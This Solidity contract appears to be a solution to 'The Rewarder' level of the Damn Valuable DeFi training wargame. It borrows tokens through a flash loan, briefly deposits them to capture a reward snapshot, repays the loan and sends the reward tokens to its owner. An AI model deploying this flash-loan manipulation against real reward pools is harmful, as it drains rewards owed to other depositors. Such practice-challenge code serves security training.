// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderExploit {

    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    address public immutable owner;

    constructor(address _flashLoanPool, address _rewarderPool, address _liquidityToken, address _rewardToken)
    {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function doFlashLoan(uint amountBorrowed) external
    {
        flashLoanPool.flashLoan(amountBorrowed);
    }

    function receiveFlashLoan(uint amountBorrowed) external
    {
        liquidityToken.approve(address(rewarderPool), amountBorrowed);
        rewarderPool.deposit(amountBorrowed);

        rewarderPool.withdraw(amountBorrowed);
        liquidityToken.transfer(address(flashLoanPool), amountBorrowed);
    }

    function withdrawRewardToken() external payable
    {
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
